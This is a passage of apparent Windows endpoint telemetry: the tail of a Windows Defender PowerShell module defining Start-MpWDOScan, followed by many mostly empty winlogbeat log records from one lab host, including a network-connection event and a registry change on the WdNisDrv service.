$script:ModuleVersion, $script:PrivateData)\n\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\n                {\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\n                }\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n\n    Begin {\n        $__cmdletization_exceptionHasBeenThrown = $false\n        try \n        {\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\n            $__cmdletization_objectModelWrapper.BeginProcessing()\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    Process {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\n\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Start', $__cmdletization_methodParameters, $__cmdletization_returnValue)\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\n\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    End {\n        try\n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper.EndProcessing()\n            }\n        }\n        catch\n        {\n            throw\n        }\n    }\n\n    # .EXTERNALHELP MSFT_MpWDOScan.cdxml-Help.xml\n}\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Start-MpWDOScan' -Alias '*'\n        "}
{"timestamp":"2021-09-15T16:35:26","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:26","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Network connection detected (rule: NetworkConnect)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:27","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:27","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry value set (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Services\\WdNisDrv\\Start","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
